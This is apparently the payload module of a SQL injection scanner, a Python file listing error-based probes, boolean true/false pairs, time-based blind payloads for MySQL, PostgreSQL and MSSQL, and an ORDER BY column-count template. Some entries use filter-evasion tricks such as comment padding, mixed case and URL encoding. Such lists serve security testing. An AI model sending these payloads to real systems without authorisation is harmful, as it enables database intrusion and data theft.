ERROR_TESTS = [
    "'",
    "\"",
    "'--",
    "\"--",
    "')",
    "' OR '1'='1",
    "'/**/OR/**/'1'='1",
    "' oR '1'='1",
    "%27",
    "'%23",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
]

TIME_PAYLOADS = [
    ("'; SELECT SLEEP(5)--", 5, "mysql"),
    ("'; SELECT pg_sleep(5)--", 5, "postgres"),
    ("'; WAITFOR DELAY '0:0:5'--", 5, "mssql"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5, "mysql"),
    ("' AND 1=BENCHMARK(5000000,MD5(1))--", 5, "mysql"),
]

ORDER_BY = "' ORDER BY {n}-- "
